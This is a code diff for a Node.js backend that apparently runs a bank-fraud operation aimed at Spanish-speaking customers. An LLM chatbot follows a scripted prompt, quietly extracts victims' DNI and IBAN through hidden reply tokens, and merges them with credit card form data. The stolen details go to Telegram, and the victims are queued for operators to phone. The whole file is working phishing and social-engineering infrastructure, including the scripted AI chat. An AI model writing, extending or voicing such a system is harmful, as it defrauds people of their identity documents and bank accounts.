@@ -1,7 +1,13 @@
 import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises';
+import { createWriteStream as fsCreateWriteStream } from 'node:fs';
+import { pipeline } from 'node:stream/promises';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { join, dirname } from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { config } from './config.js';
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
+const CHAT_PROMPT_FILE = join(__dirname, '..', 'chat-prompt.md');
 import { createAccessToken, isGranted } from './grantStore.js';
 import { HUMAN_UI, BOT_UI } from './humanUi.js';
 import { maskName, maskPhone, sanitizeString } from './mask.js';
@@ -16,6 +22,7 @@ import { randomUUID } from 'node:crypto';
 // ── Admin sessions (in-memory, очищаются при рестарте) ────────────────────────
 const adminSessions = new Set();
 const callerSessions = new Set();
+const chatOpSessions = new Set();
 
 // ── App settings (IBAN / beneficiario) ───────────────────────────────────────
 const SETTINGS_FILE = join(process.cwd(), 'data', 'app-settings.json');
@@ -506,7 +513,7 @@ async function handleCreditCardSubmission(req, reply) {
   try {
     const body = asRecord(req.body) ?? {};
     const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
-    const submissionData = {
+    const formData = {
       nombre: sanitizeString(getString(body.nombre), 200),
       phone: sanitizeString(getString(body.phone), 30),
       dni: sanitizeString(getString(body.dni), 20),
@@ -518,6 +525,27 @@ async function handleCreditCardSubmission(req, reply) {
       cp: sanitizeString(getString(body.cp), 10),
       email: sanitizeString(getString(body.email), 200),
     };
+
+    // Merge with existing submissionData to preserve DNI/IBAN collected during chat
+    let existingSub = {};
+    if (flowSessionId) {
+      try {
+        const existing = await prisma.webClient.findUnique({
+          where: { flowSessionId },
+          select: { submissionData: true },
+        });
+        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object')
+          ? existing.submissionData : {};
+      } catch { /* non-fatal */ }
+    }
+
+    const submissionData = { ...existingSub };
+    for (const [k, v] of Object.entries(formData)) {
+      if (v) submissionData[k] = v;
+    }
+    // Preserve DNI/IBAN from chat if form doesn't supply them
+    if (!formData.dni && existingSub.dni) submissionData.dni = existingSub.dni;
+    if (!formData.iban && existingSub.iban) submissionData.iban = existingSub.iban;
 
     if (flowSessionId) {
       await upsertWebClient(flowSessionId, {
@@ -566,7 +594,7 @@ async function handleCallerClients(req, reply) {
   if (!requireCaller(req, reply)) return;
   try {
     const clients = await prisma.webClient.findMany({
-      where: { callRequested: true, clientType: { not: 'olduser' } },
+      where: { callRequested: true, clientType: { not: 'olduser' }, operatorCalled: false },
       orderBy: { updatedAt: 'desc' },
       select: {
         id: true, flowSessionId: true, email: true, bank: true,
@@ -581,7 +609,7 @@ async function handleCallerClients(req, reply) {
     console.error('[caller-clients] primary query error, trying fallback:', err?.message || err);
     try {
       const clients = await prisma.webClient.findMany({
-        where: { callRequested: true, clientType: { not: 'olduser' } },
+        where: { callRequested: true, clientType: { not: 'olduser' }, operatorCalled: false },
         orderBy: { updatedAt: 'desc' },
         select: {
           id: true, flowSessionId: true, email: true, bank: true,
@@ -934,7 +962,7 @@ async function handleChat(req, reply) {
     const system = buildSystemPrompt(cfg.systemPrompt, { name, bank });
     const llmMessages = historyToLlm(system, history);
     if (start && history.length === 0) {
-      llmMessages.push({ role: 'user', content: '[El usuario acaba de abrir el chat. Salúdale e inicia el guion.]' });
+      llmMessages.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни сценарий.]' });
     }
 
     const rawReply = await deepseekChat(llmMessages, {
@@ -943,10 +971,46 @@ async function handleChat(req, reply) {
       maxTokens: cfg.maxTokens,
     });
 
+    // Extract hidden tokens before stripping them from the user-visible text
+    const dniMatch = rawReply.match(/\[\[DNI:([A-Z0-9]{5,20})\]\]/i);
+    const ibanMatch = rawReply.match(/\[\[IBAN:([A-Z]{2}[0-9A-Z]{10,30})\]\]/i);
+    const extractedDni = dniMatch ? dniMatch[1].toUpperCase() : null;
+    const extractedIban = ibanMatch ? ibanMatch[1].replace(/\s/g, '').toUpperCase() : null;
+
     const isDone = rawReply.includes('[[FIN]]');
-    const replyText = rawReply.replace(/\[\[FIN\]\]/g, '').trim();
+    const replyText = rawReply
+      .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
+      .replace(/\[\[IBAN:[^\]]*\]\]/gi, '')
+      .replace(/\[\[FIN\]\]/g, '')
+      .trim();
 
     await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
+
+    // Save DNI/IBAN to webClient when bot has collected them
+    if (isDone && (extractedDni || extractedIban)) {
+      try {
+        const existingClient = await prisma.webClient.findUnique({
+          where: { flowSessionId: sessionId },
+          select: { submissionData: true },
+        });
+        const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
+          ? existingClient.submissionData : {};
+        const newSub = { ...existingSub };
+        if (extractedDni) newSub.dni = extractedDni;
+        if (extractedIban) newSub.iban = extractedIban;
+        await upsertWebClient(sessionId, { submissionData: newSub });
+        const tgLines = [
+          '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
+          `Session: \`${sessionId}\``,
+          extractedDni ? `DNI: \`${extractedDni}\`` : '',
+          extractedIban ? `IBAN: \`${extractedIban}\`` : '',
+        ].filter(Boolean);
+        sendToTelegram(tgLines.join('\n'));
+      } catch (e) {
+        console.error('[chat] DNI/IBAN save error:', e?.message);
+      }
+    }
+
     return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}) });
   } catch (err) {
     console.error('[chat] error:', err?.message || err);
@@ -1116,7 +1180,389 @@ async function handleAdminStats(req, reply) {
   }
 }
 
+// ─── Support chat (chat.html) ─────────────────────────────────────────────────
+// Separate session prefix "chat:" keeps histories isolated from assistant.html ("web:").
+
+async function readChatPromptFile() {
+  try { return (await readFile(CHAT_PROMPT_FILE, 'utf8')).trim(); } catch { return ''; }
+}
+
+function chatLeadKey(sessionId) {
+  return `chat:${sessionId}`;
+}
+
+async function handleSupportChat(req, reply) {
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
+
+    const message = sanitizeString(getString(body.message), 4000);
+    const start = body.start === true;
+    const name = sanitizeString(getString(body.name), 120);
+    const bank = sanitizeString(getString(body.bank), 120);
+
+    if (!start && !message) return reply.status(400).send({ error: 'message required' });
+
+    const key = chatLeadKey(sessionId);
+    const lead = await prisma.lead.upsert({
+      where: { tgId: key },
+      create: { tgId: key, chatId: key, firstName: name || null },
+      update: name ? { firstName: name } : {},
+    });
+
+    // If AI is disabled — save the message for audit but don't call AI
+    if (!lead.aiEnabled) {
+      if (message) {
+        await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
+      }
+      return reply.send({ reply: '' });
+    }
+
+    const cfg = await getBotConfig();
+    if (!cfg.aiEnabled) {
+      return reply.send({ reply: '', disabled: true });
+    }
+
+    if (message) {
+      await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
+    }
+
+    const history = await prisma.message.findMany({
+      where: { leadId: lead.id },
+      orderBy: { createdAt: 'asc' },
+      take: cfg.historyLimit,
+    });
+
+    if (start && !message) {
+      const last = [...history].reverse().find((m) => m.role === 'ASSISTANT');
+      if (last) return reply.send({ reply: last.content });
+    }
+
+    const rawPrompt = (await readChatPromptFile()) || 'Ты специалист поддержки. Помоги клиенту.';
+    const system = buildSystemPrompt(rawPrompt, { name, bank });
+
+    const msgs = [{ role: 'system', content: system }];
+    for (const m of history) {
+      if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
+      else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
+    }
+    if (start && history.length === 0) {
+      msgs.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни диалог.]' });
+    }
+
+    const rawReply = await deepseekChat(msgs, {
+      model: cfg.model,
+      temperature: cfg.temperature,
+      maxTokens: cfg.maxTokens,
+    });
+
+    const isDone = rawReply.includes('[[DONE]]');
+    const replyText = rawReply.replace(/\[\[DONE\]\]/g, '').trim();
+
+    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
+
+    if (isDone) {
+      // Disable further AI replies for this lead
+      await prisma.lead.update({ where: { id: lead.id }, data: { aiEnabled: false } });
+
+      // Mark webClient as call-requested so they appear in caller panel
+      const ip = getClientIp(req);
+      const country = getGeoFromHeaders(req)?.country || '';
+      let nombre = name;
+      let bank_ = bank;
+      try {
+        const wc = await prisma.webClient.findUnique({
+          where: { flowSessionId: sessionId },
+          select: { nombre: true, bank: true, submissionData: true },
+        });
+        if (wc) {
+          nombre = nombre || wc.nombre || '';
+          bank_ = bank_ || wc.bank || '';
+        }
+      } catch { /* non-fatal */ }
+
+      try {
+        await prisma.webClient.upsert({
+          where: { flowSessionId: sessionId },
+          create: {
+            flowSessionId: sessionId,
+            callRequested: true,
+            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
+            ip: ip || '',
+            ...(nombre ? { nombre } : {}),
+            ...(bank_ ? { bank: bank_ } : {}),
+          },
+          update: {
+            callRequested: true,
+            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
+            ip: ip || '',
+            ...(nombre ? { nombre } : {}),
+            ...(bank_ ? { bank: bank_ } : {}),
+          },
+        });
+      } catch (wcErr) {
+        console.error('[support-chat] upsertWebClient failed:', wcErr?.message || wcErr);
+      }
+      await createWebEvent(sessionId, null, 'tourist_call_requested', { bank: bank_ || null, ip: ip || null });
+
+      const lines = [
+        '*💬 КЛИЕНТ ЗАКОНЧИЛ ЧАТ (передан оператору)*',
+        `Session: \`${sessionId}\``,
+        nombre ? `Имя: *${nombre}*` : '',
+        bank_ ? `Банк: *${bank_}*` : '',
+        `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
+      ].filter(Boolean);
+      sendToTelegram(lines.join('\n'));
+    }
+
+    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}) });
+  } catch (err) {
+    console.error('[support-chat] error:', err?.message || err);
+    return reply.status(500).send({ error: 'chat_failed' });
+  }
+}
+
+async function handleSupportChatHistory(req, reply) {
+  const sessionId = sanitizeString(req.params.sessionId || '', 80);
+  reply.header('Cache-Control', 'no-store');
+  if (!sessionId) return reply.send({ messages: [], closed: false });
+  const lead = await prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } });
+  if (!lead) return reply.send({ messages: [], closed: false });
+  const history = await prisma.message.findMany({
+    where: { leadId: lead.id },
+    orderBy: { createdAt: 'asc' },
+    select: { role: true, content: true },
+  });
+  return reply.send({
+    messages: history.map((m) => ({ role: m.role.toLowerCase(), content: m.content })),
+    closed: !lead.aiEnabled,
+  });
+}
+
+async function handleGetChatPrompt(req, reply) {
+  if (!requireAdmin(req, reply)) return;
+  const prompt = await readChatPromptFile();
+  return reply.send({ chatPrompt: prompt });
+}
+
+async function handleUpdateChatPrompt(req, reply) {
+  if (!requireAdmin(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    if (typeof body.chatPrompt !== 'string') return reply.status(400).send({ error: 'chatPrompt required' });
+    const prompt = sanitizeString(body.chatPrompt, 20000).replace(/\r\n/g, '\n');
+    await writeFile(CHAT_PROMPT_FILE, prompt.endsWith('\n') ? prompt : prompt + '\n', 'utf8');
+    return reply.send({ chatPrompt: prompt });
+  } catch (err) {
+    console.error('[admin] update chat-prompt error:', err?.message || err);
+    return reply.status(500).send({ error: 'update_failed' });
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Chat operator (chat/index.html)
+// ─────────────────────────────────────────────────────────────────────────────
+
+function requireChatOp(req, reply) {
+  const auth = req.headers['authorization'] || '';
+  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
+  if (!token || !chatOpSessions.has(token)) {
+    reply.status(401).send({ error: 'unauthorized' });
+    return false;
+  }
+  return true;
+}
+
+async function handleChatOpLogin(req, reply) {
+  const body = asRecord(req.body) ?? {};
+  const login = getString(body.login);
+  const password = getString(body.password);
+  if (login !== config.chatOp.login || password !== config.chatOp.password) {
+    return reply.status(401).send({ error: 'Неверный логин или пароль' });
+  }
+  const token = randomUUID() + randomUUID();
+  chatOpSessions.add(token);
+  return reply.send({ token });
+}
+
+async function handleChatOpClients(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  try {
+    const clients = await prisma.webClient.findMany({
+      where: { operatorCalled: true },
+      orderBy: { updatedAt: 'desc' },
+      select: {
+        id: true, flowSessionId: true, nombre: true, email: true, bank: true,
+        ip: true, status: true, callerNote: true, submissionData: true,
+        calledAt: true, createdAt: true, updatedAt: true,
+        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
+      },
+    });
+    const enriched = await Promise.all(clients.map(async (c) => {
+      try {
+        const lead = await prisma.lead.findUnique({
+          where: { tgId: chatLeadKey(c.flowSessionId) },
+          select: { id: true, aiEnabled: true },
+        });
+        let lastMsg = null;
+        if (lead) {
+          const last = await prisma.message.findFirst({
+            where: { leadId: lead.id },
+            orderBy: { createdAt: 'desc' },
+            select: { role: true, content: true, createdAt: true },
+          });
+          if (last) lastMsg = { role: last.role === 'SYSTEM' ? 'operator' : last.role.toLowerCase(), content: last.content, createdAt: last.createdAt };
+        }
+        return { ...c, lastMsg };
+      } catch { return { ...c, lastMsg: null }; }
+    }));
+    return reply.send({ clients: enriched });
+  } catch (err) {
+    console.error('[chat-op/clients]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleChatOpMessages(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  const sessionId = sanitizeString(req.params.sessionId || '', 80);
+  if (!sessionId) return reply.send({ messages: [], callerNote: null });
+  try {
+    const [lead, wc] = await Promise.all([
+      prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } }),
+      prisma.webClient.findUnique({ where: { flowSessionId: sessionId }, select: { callerNote: true, nombre: true, email: true, bank: true, ip: true, submissionData: true } }),
+    ]);
+    if (!lead) return reply.send({ messages: [], callerNote: wc?.callerNote || null, client: wc });
+    const history = await prisma.message.findMany({
+      where: { leadId: lead.id },
+      orderBy: { createdAt: 'asc' },
+      select: { role: true, content: true, createdAt: true },
+    });
+    const sub = (wc?.submissionData && typeof wc.submissionData === 'object') ? wc.submissionData : {};
+    return reply.send({
+      messages: history.map((m) => ({ role: m.role === 'SYSTEM' ? 'operator' : m.role.toLowerCase(), content: m.content, createdAt: m.createdAt })),
+      callerNote: wc?.callerNote || null,
+      chatLastReadAt: sub.chatLastReadAt || null,
+      client: wc,
+    });
+  } catch (err) {
+    console.error('[chat-op/messages]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleChatOpSend(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    const message = sanitizeString(getString(body.message), 4000);
+    if (!sessionId || !message) return reply.status(400).send({ error: 'missing fields' });
+    const key = chatLeadKey(sessionId);
+    const lead = await prisma.lead.upsert({
+      where: { tgId: key },
+      create: { tgId: key, chatId: key },
+      update: {},
+    });
+    await prisma.message.create({ data: { leadId: lead.id, role: 'SYSTEM', content: message } });
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[chat-op/send]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleChatOpRequestCall(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    const comment = sanitizeString(getString(body.comment), 500);
+    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
+    const existing = await prisma.webClient.findUnique({
+      where: { flowSessionId: sessionId },
+      select: { submissionData: true },
+    });
+    const existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
+    await prisma.webClient.upsert({
+      where: { flowSessionId: sessionId },
+      create: { flowSessionId: sessionId, callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
+      update: { callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
+    });
+    sendToTelegram(`*📞 ЧАТ-ОПЕРАТОР: ЗАКАЗАН ЗВОНОК*\nSession: \`${sessionId}\`${comment ? `\nКомментарий: _${comment}_` : ''}`);
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[chat-op/request-call]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleChatOpSaveNote(req, reply) {
+  if (!requireChatOp(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    const note = sanitizeString(getString(body.note), 2000);
+    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
+    await prisma.webClient.upsert({
+      where: { flowSessionId: sessionId },
+      create: { flowSessionId: sessionId, callerNote: note || null },
+      update: { callerNote: note || null },
+    });
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[chat-op/note]', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleSupportChatMarkRead(req, reply) {
+  try {
+    const body = asRecord(req.body) ?? {};
+    const sessionId = sanitizeString(getString(body.sessionId), 80);
+    if (!sessionId) return reply.send({ ok: true });
+    const existing = await prisma.webClient.findUnique({
+      where: { flowSessionId: sessionId },
+      select: { submissionData: true },
+    });
+    const sub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
+    await prisma.webClient.upsert({
+      where: { flowSessionId: sessionId },
+      create: { flowSessionId: sessionId, submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
+      update: { submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
+    });
+    return reply.send({ ok: true });
+  } catch { return reply.send({ ok: true }); }
+}
+
+// ── Image upload ──────────────────────────────────────────────────────────────
+const UPLOADS_DIR = join(__dirname, '..', 'uploads');
+const ALLOWED_MIME = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);
+
+async function handleUploadImage(req, reply) {
+  try {
+    const data = await req.file();
+    if (!data) return reply.status(400).send({ error: 'No file' });
+    const mime = data.mimetype || '';
+    if (!ALLOWED_MIME.has(mime)) return reply.status(400).send({ error: 'Invalid file type' });
+    const ext = mime === 'image/png' ? '.png' : mime === 'image/gif' ? '.gif' : mime === 'image/webp' ? '.webp' : '.jpg';
+    await mkdir(UPLOADS_DIR, { recursive: true });
+    const filename = `${randomUUID()}${ext}`;
+    const dest = join(UPLOADS_DIR, filename);
+    await pipeline(data.file, fsCreateWriteStream(dest));
+    return reply.send({ url: `/uploads/${filename}` });
+  } catch (err) {
+    console.error('[upload-image]', err?.message || err);
+    return reply.status(500).send({ error: 'Upload failed' });
+  }
+}
+
 export async function registerApiRoutes(app) {
+  // Multipart for image uploads
+  await app.register((await import('@fastify/multipart')).default, { limits: { fileSize: 10 * 1024 * 1024 } });
+
   // Public settings
   app.get('/api/settings', handleGetSettings);
 
@@ -1133,15 +1579,22 @@ export async function registerApiRoutes(app) {
   app.get('/api/scratch-access/:token', handleScratchAccess);
   app.post('/api/scratch-verify', { config: { rawBody: false } }, handleScratchVerify);
 
-  // AI chat
+  // AI chat (assistant.html)
   app.post('/api/chat', handleChat);
   app.get('/api/chat/history/:sessionId', handleChatHistory);
+
+  // Support chat (chat.html) — separate session & prompt
+  app.post('/api/support-chat', handleSupportChat);
+  app.get('/api/support-chat/history/:sessionId', handleSupportChatHistory);
+  app.post('/api/support-chat/read', handleSupportChatMarkRead);
 
   // Full admin
   app.post('/api/admin/login', handleAdminLogin);
   app.post('/api/admin/logout', handleAdminLogout);
   app.get('/api/admin/bot-config', handleGetBotConfig);
   app.put('/api/admin/bot-config', handleUpdateBotConfig);
+  app.get('/api/admin/chat-prompt', handleGetChatPrompt);
+  app.put('/api/admin/chat-prompt', handleUpdateChatPrompt);
   app.get('/api/admin/clients', handleAdminClients);
   app.delete('/api/admin/clients/:id', handleAdminDeleteClient);
   app.get('/api/admin/clients/:sessionId/chat', handleAdminClientChat);
@@ -1159,6 +1612,17 @@ export async function registerApiRoutes(app) {
   app.get('/api/caller/call-logs', handleGetCallLogs);
   app.post('/api/caller/call-logs', handleAddCallLog);
   app.post('/api/caller/call-logs/:id/mark', handleMarkCallLog);
+
+  // Chat operator (chat/index.html)
+  app.post('/api/chat-op/login', handleChatOpLogin);
+  app.get('/api/chat-op/clients', handleChatOpClients);
+  app.get('/api/chat-op/messages/:sessionId', handleChatOpMessages);
+  app.post('/api/chat-op/send', handleChatOpSend);
+  app.post('/api/chat-op/request-call', handleChatOpRequestCall);
+  app.put('/api/chat-op/note', handleChatOpSaveNote);
+
+  // Image upload (client + operator)
+  app.post('/api/upload-image', handleUploadImage);
 
   // SSE for real-time updates
   app.get('/api/sse', handleSSE);
